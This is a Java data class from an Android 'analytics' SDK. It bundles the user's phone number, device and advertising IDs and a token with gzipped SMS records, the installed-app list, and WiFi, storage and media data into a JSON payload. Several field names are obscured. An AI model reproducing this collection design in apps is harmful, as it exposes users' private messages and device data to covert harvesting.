package com.test.aoner.fanow.test.analytics.flowerdata_sdk.flowerbeans;

import com.google.gson.Gson;
import com.test.aoner.fanow.test.analytics.flowerdata_sdk.FlowerASBuilder;
import com.test.aoner.fanow.test.constant_flower.Constant_flower;
import com.test.aoner.fanow.test.util_flower.helper_flower.UserInfoHelper_flower;
import com.test.aoner.fanow.test.util_flower.http_flower.HttpManager_flower;

public class FlowerASRequestPms {

    public String app;
    public String token;
    public String product;
    public String androidId;
    public String advertId;
    public String orderId;
    public String tz;
    public String packageName;
    public String transactionId;
    public String type;
    public String userPhone;
    public String d98D="";
    public String zwX1="";
    public String iOk8="";
    public String version = "40";
    public String client = "ANDROID";
    public FlowerASDecBn deviceInfo;
    public String appListGzip;
    public String smsRecordsGzip;
    public String smsFetchType;
    public String deviceHardwareGzip;
    public String deviceStorageGzip;
    public String deviceWifiGzip;
    public String deviceBatteryGzip;
    public String deviceMediaGzip;

    public FlowerASRequestPms() {
        this.app = Constant_flower.PRODUCT;
        this.product = Constant_flower.PRODUCT;
        this.token = UserInfoHelper_flower.getInstance().getToken();
        this.androidId = FlowerASBuilder.KEY_ANDROID;
        this.orderId = FlowerASBuilder.KEY_ORDER_ID;
        this.advertId = FlowerASBuilder.KEY_ADVERT_ID;
        this.tz = FlowerASBuilder.KEY_TZ;

    }

    public String getTp() {
        return this.type;
    }

    public void setTp(String paramString) {
        this.type = paramString;
    }

    public String getUP() {
        return this.userPhone;
    }

    public void setUP(String paramString) {
        this.userPhone = paramString;
    }

    public void setSRG(String smsRecordsGzip) {
        this.smsRecordsGzip = smsRecordsGzip;
    }



    public void setTI(String paramString) {
        this.transactionId = paramString;
    }

    public String getVs() {
        return this.version;
    }

    public void setVs(String paramString) {
        this.version = paramString;
    }

    public String getTk() {
        return token;
    }

    public void setTk(String token) {
        this.token = token;
    }

    public String getPN() {
        return this.packageName;
    }

    public String getApp() {
        return app;
    }

    public String getToken() {
        return token;
    }

    public String getProduct() {
        return product;
    }

    public String getAndroidId() {
        return androidId;
    }

    public String getAdvertId() {
        return advertId;
    }

    public String getOrderId() {
        return orderId;
    }

    public String getTz() {
        return tz;
    }

    public String getPackageName() {
        return packageName;
    }

    public String getTransactionId() {
        return transactionId;
    }

    public String getType() {
        return type;
    }

    public String getUserPhone() {
        return userPhone;
    }

    public String getD98D() {
        return d98D;
    }

    public String getZwX1() {
        return zwX1;
    }

    public String getiOk8() {
        return iOk8;
    }

    public String getVersion() {
        return version;
    }

    public String getClient() {
        return client;
    }

    public FlowerASDecBn getDeviceInfo() {
        return deviceInfo;
    }

    public String getAppListGzip() {
        return appListGzip;
    }

    public String getSmsRecordsGzip() {
        return smsRecordsGzip;
    }

    public String getSmsFetchType() {
        return smsFetchType;
    }

    public String getDeviceHardwareGzip() {
        return deviceHardwareGzip;
    }

    public String getDeviceStorageGzip() {
        return deviceStorageGzip;
    }

    public String getDeviceWifiGzip() {
        return deviceWifiGzip;
    }

    public String getDeviceBatteryGzip() {
        return deviceBatteryGzip;
    }

    public void setApp(String app) {
        this.app = app;
    }

    public void setToken(String token) {
        this.token = token;
    }

    public void setProduct(String product) {
        this.product = product;
    }

    public void setAndroidId(String androidId) {
        this.androidId = androidId;
    }

    public void setAdvertId(String advertId) {
        this.advertId = advertId;
    }

    public void setOrderId(String orderId) {
        this.orderId = orderId;
    }

    public void setTz(String tz) {
        this.tz = tz;
    }

    public void setPackageName(String packageName) {
        this.packageName = packageName;
    }

    public void setTransactionId(String transactionId) {
        this.transactionId = transactionId;
    }

    public void setType(String type) {
        this.type = type;
    }

    public void setUserPhone(String userPhone) {
        this.userPhone = userPhone;
    }

    public void setD98D(String d98D) {
        this.d98D = d98D;
    }

    public void setZwX1(String zwX1) {
        this.zwX1 = zwX1;
    }

    public void setiOk8(String iOk8) {
        this.iOk8 = iOk8;
    }

    public void setVersion(String version) {
        this.version = version;
    }

    public void setClient(String client) {
        this.client = client;
    }

    public void setDeviceInfo(FlowerASDecBn deviceInfo) {
        this.deviceInfo = deviceInfo;
    }

    public void setAppListGzip(String appListGzip) {
        this.appListGzip = appListGzip;
    }

    public void setSmsRecordsGzip(String smsRecordsGzip) {
        this.smsRecordsGzip = smsRecordsGzip;
    }

    public void setSmsFetchType(String smsFetchType) {
        this.smsFetchType = smsFetchType;
    }

    public void setDeviceHardwareGzip(String deviceHardwareGzip) {
        this.deviceHardwareGzip = deviceHardwareGzip;
    }

    public void setDeviceStorageGzip(String deviceStorageGzip) {
        this.deviceStorageGzip = deviceStorageGzip;
    }

    public void setDeviceWifiGzip(String deviceWifiGzip) {
        this.deviceWifiGzip = deviceWifiGzip;
    }

    public void setDeviceBatteryGzip(String deviceBatteryGzip) {
        this.deviceBatteryGzip = deviceBatteryGzip;
    }

    public void setDeviceMediaGzip(String deviceMediaGzip) {
        this.deviceMediaGzip = deviceMediaGzip;
    }

    public String getDeviceMediaGzip() {
        return deviceMediaGzip;
    }





    public void setPN(String paramString) {
        this.packageName = paramString;
    }

    public FlowerASDecBn getDecI() {
        return deviceInfo;
    }

    public void setDecI(FlowerASDecBn deviceInfo) {
        this.deviceInfo = deviceInfo;
    }

    public String getALG() {
        return appListGzip;
    }

    public void setALG(String appListGzip) {
        this.appListGzip = appListGzip;
    }

    public String getSRG() {
        return smsRecordsGzip;
    }



    public String toParams(){
        return new Gson().toJson(this).trim();
    }


    public String getClt() {
        return client;
    }

    public void setClt(String client) {
        this.client = client;
    }

    public String getDHG() {
        return deviceHardwareGzip;
    }

    public void setDHG(String deviceHardwareGzip) {
        this.deviceHardwareGzip = deviceHardwareGzip;
    }

    public String getDSG() {
        return deviceStorageGzip;
    }

    public void setDSG(String deviceStorageGzip) {
        this.deviceStorageGzip = deviceStorageGzip;
    }

    public String getDWG() {
        return deviceWifiGzip;
    }

    public void setDWG(String deviceWifiGzip) {
        this.deviceWifiGzip = deviceWifiGzip;
    }

    public String getDBG() {
        return deviceBatteryGzip;
    }

    public void setDBG(String deviceBatteryGzip) {
        this.deviceBatteryGzip = deviceBatteryGzip;
    }

    public String getDMG() {
        return deviceMediaGzip;
    }

    public void setDMG(String deviceMediaGzip) {
        this.deviceMediaGzip = deviceMediaGzip;
    }

    public String getSFT() {
        return smsFetchType;
    }

    public void setSFT(String smsFetchType) {
        this.smsFetchType = smsFetchType;
    }

    public String getTI() {
        return this.transactionId;
    }

}
